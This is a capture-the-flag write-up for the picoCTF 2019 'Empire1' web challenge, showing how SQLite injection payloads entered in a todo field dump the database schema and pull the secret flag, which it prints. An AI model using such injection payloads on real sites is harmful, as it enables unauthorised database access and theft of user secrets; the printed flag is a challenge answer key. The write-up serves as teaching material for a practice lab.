# Empire1 - 400 points
Web_Exploitation

## Description:
> Psst, Agent 513, now that you're an employee of Evil Empire Co., try to get their secrets off the company website. https://2019shell1.picoctf.com/problem/12234/ (link) Can you first find the secret code they assigned to you?

## Hint:
> Pay attention to the feedback you get
> There is *very* limited filtering in place - this to stop you from breaking the challenge for yourself, not for you to bypass.
> The database gets reverted every 2 hours if you do break it, just come back later

## Solving:
So we are brought to the 'Evil Empire Company' website and are given a login and register page. Witht the hint emphasising databases we know that's where we want to look. No apparent SQLi attacks here so after registering an account we are given access to a 'Add a Todo' and a 'Your Todos' page. The former allows us to input some text and submit. This is then posted to the 'Your Todos' page with the prefix '**Very Urgent: **'.
After putting a very basic SQL injection test of ```' OR '1' = '1``` the query is accepted and is posted as ```1``` on the list page - meaning that the server processed the request and returned a 'True' value.
With this we can then try and enumerate what DBMS the server is using by putting some fingerprinting queries:
MySQL:
```php
SELECT @@version
```
> Internal Server Error
> The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.

Since this resulted in an error I decided I would then try a SQLite SQLi:
```php
' || (SELECT sql FROM sqlite_master WHERE type='table') || '

result:

CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(64), name VARCHAR(128), password_hash VARCHAR(128), secret VARCHAR(128), admin INTEGER, PRIMARY KEY (id) ) 
```
so from this we can identify that the table 'user' has a column named 'secret'. so if we adjust our SQLi we can hopefully output a flag in the 'secret' column:
```php
' || (SELECT secret FROM user WHERE secret LIKE 'picoCTF%') || '

results:

picoCTF{wh00t_it_a_sql_inject46527b2c} 
```



### Flag: 

```
picoCTF{wh00t_it_a_sql_inject46527b2c} ```
